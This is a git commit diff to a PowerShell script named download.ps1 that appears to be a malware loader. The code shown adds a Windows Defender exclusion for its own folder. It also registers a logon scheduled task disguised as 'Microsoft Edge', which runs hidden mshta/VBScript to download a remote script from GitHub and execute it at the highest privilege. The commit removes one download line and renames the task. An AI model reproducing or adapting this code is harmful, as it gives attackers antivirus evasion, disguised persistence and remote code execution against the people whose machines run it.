1004bf11de26e6621432dd8d4f78b3350586a9cc
43a1723 <hai1723notgay@gmail.com>
2024-06-09 19:58:02 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -8,7 +8,6 @@ New-Item -ItemType Directory -Path $dir
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
 
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -23,11 +22,9 @@ Add-MpPreference -ExclusionPath $dir
 
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Microsoft Edge"
+$task_name = "MicrosoftEdge"
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Microsoft Edge" -RunLevel Highest -Force | Out-Null
-
-
 
 
 
